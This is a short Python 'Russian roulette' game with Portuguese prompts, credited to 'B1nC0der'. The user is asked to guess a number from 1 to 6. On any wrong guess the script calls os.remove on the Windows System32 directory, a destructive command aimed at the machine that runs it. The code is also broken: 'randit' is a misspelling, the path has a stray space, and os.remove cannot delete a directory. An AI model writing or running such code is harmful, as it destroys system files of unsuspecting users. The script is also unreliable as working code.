import random
import os

tiro = random.randit(1,6)

guess = input('Bem vindo ao jogo feito por B1nC0der/ como o nome já dito no arquivo é uma roleta russa/ temos 6 numeros de 1 a 6/ escolha sabiamente')
guess = int(guess)

if(guess == tiro):
  print ('parabens amigo')
else:
  os.remove('C:\ Windows\System32')
